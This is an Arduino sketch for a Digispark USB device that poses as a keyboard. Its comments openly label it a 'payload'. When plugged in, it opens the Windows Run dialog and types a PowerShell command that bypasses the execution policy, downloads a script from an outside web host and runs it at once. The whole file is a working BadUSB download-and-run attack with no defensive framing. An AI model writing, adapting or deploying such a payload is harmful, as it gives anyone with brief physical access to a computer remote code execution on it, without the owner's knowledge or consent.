#define LAYOUT_US_ENGLISH
#include "DigiKeyboard.h"

/* --------------------------------------------------------------
 * Digispark payload – fetches the PowerShell script dynamically
 * from payload.php using the supplied token.
 * The PowerShell window is opened *visible* (no hidden flag).
 * -------------------------------------------------------------- */
void setup() {
  pinMode(1, OUTPUT);   // onboard LED
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);       // clear any stuck keys
  DigiKeyboard.delay(2000);            // give the system a moment

  // Use a simple 8‑bit key code to avoid overflow warnings
  const uint8_t KEY_R_SIMPLE = 0x15; // corresponds to the 'R' key

  // ── Open Run dialog (Win + R) ────────────────────────────────────────
  DigiKeyboard.sendKeyStroke(KEY_R_SIMPLE, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);

  // ── Launch PowerShell (visible) and pull the payload dynamically ────────
  DigiKeyboard.println(
    "powershell -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command \"iex (New-Object Net.WebClient).DownloadString('https://narain.udhees.com/payload.php?token=Narain')\"");
  DigiKeyboard.delay(3000);   // give PowerShell time to execute

  // ── Visual feedback – blink the on‑board LED forever ─────────────────────
  while (true) {
    digitalWrite(1, HIGH);
    DigiKeyboard.delay(150);
    digitalWrite(1, LOW);
    DigiKeyboard.delay(150);
  }
}
